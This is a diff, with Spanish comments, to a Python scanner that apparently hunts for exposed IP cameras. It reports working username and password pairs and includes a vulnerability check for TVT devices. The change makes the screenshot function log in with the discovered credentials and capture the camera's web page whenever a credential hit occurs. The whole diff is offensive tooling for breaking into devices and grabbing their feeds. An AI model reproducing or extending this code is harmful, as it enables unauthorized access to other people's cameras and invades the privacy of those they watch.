@@ -215,6 +215,7 @@ def manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cance
             print(Colors.YELLOW + 'Falso Positivo' + Colors.DEFAULT)
         else:
             print(Colors.GREEN + f'[+] Posible-Vulnerabilidad en {url} con usuario {usuario} y contraseña {contraseña}.' + Colors.DEFAULT)
+            capture_screenshot(ip, port, usuario=usuario, contraseña=contraseña)
             guardar_url(ip, port, url, usuario, contraseña)
 
 # Modifica la función enviar_solicitud_individual para pasar también la contraseña a manejar_respuesta
@@ -449,12 +450,20 @@ def check_vuln_tvt(ip, port):
     print(Colors.GREEN + f"[{ip}:{port}] - Posible Exploit" + Colors.DEFAULT)
     return True
 
-def capture_screenshot(ip, port):
+def capture_screenshot(ip, port, usuario=None, contraseña=None):
     try:
         url = f"http://{ip}:{port}"
-        response = requests.get(url, timeout=5)
 
-        if not response.ok:
+        # Autenticarse si se proporcionan credenciales
+        if usuario is not None and contraseña is not None:
+            auth = (usuario, contraseña)
+        else:
+            auth = None
+
+        session = requests.Session()
+        response = session.get(url, auth=auth, timeout=5)
+
+        if not response.ok and response.status_code != 401:
             return
 
         chrome_options = webdriver.ChromeOptions()
@@ -607,8 +616,8 @@ def scan(ip, ports):
                         capture_screenshot(ip, port)
                     
                     if is_camera(ip, port) and not "HTTP/1.0 302 Found" in banner and not "unknown" in banner:
-                        if args.has_screenshot == 'cam':
-                            capture_screenshot(ip, port)
+                        if args.has_screenshot == 'cam' and "HTTP/1.1 401 Unauthorized" not in banner:
+                            capture_screenshot(ip, port, usuario=None, contraseña=None)
                         if "HTTP/1.0 401 Unauthorized Access Denied" in banner or "HTTP/1.1 401 Unauthorized" in banner:
                             cam = verificar_respuesta_200(ip,port,tiempo_cancelacion=1)
                         print(f"{Fore.GREEN}[+]Camara-Encontrada{Style.RESET_ALL}")
